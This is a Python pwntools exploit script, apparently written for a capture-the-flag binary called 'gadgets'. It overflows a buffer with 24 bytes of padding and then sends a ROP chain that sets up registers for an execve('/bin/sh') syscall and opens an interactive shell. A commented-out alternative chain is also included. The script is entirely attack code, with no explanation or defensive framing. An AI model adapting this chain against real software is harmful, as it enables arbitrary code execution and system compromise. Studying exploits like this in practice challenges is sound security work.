from pwn import *

p = process("./gadgets")
#p = gdb.debug("./gadgets",'b main')
p.recvuntil("seconds.")

payload = "A"*24
payload+=p64(0x00000000004005d5) #pop rax;ret
payload+=p64(0x000000000000003B)
payload+=p64(0x00000000004005ba) #pop rdi;ret
payload+=p64(0x0000000000400741) #/bin/sh
payload+=p64(0x00000000004005CC) #pop rsi;ret
payload+=p64(0x00)
payload+=p64(0x00000000004005c3) #pop rdx;ret;
payload+=p64(0x00)
payload+=p64(0x00000000004005de)
payload+=p64(0x0000000000000090)
'''payload+=p64(0x00000000004005d5)
payload+=p64(0x000000000000003c)
payload+=p64(0x00000000004005ba)
payload+=p64(0x0000000000000000)
payload+=p64(0x00000000004005de)




payload = "A"*24
payload+=p64(0x00000000004005d1) #pop rax;ret
payload+=p64(0x000000000000000B)
payload+=p64(0x00000000004005b6) #pop rdi;ret
payload+=p64(0x0000000000400741) #/bin/sh
payload+=p64(0x00000000004005c8) #pop rsi;ret
payload+=p64(0x00)
payload+=p64(0x00000000004005bf) #pop rdx;ret;
payload+=p64(0x00)
payload+=p64(0x00000000004005da)
'''
gdb.attach(p)
p.sendline(payload)

p.interactive()

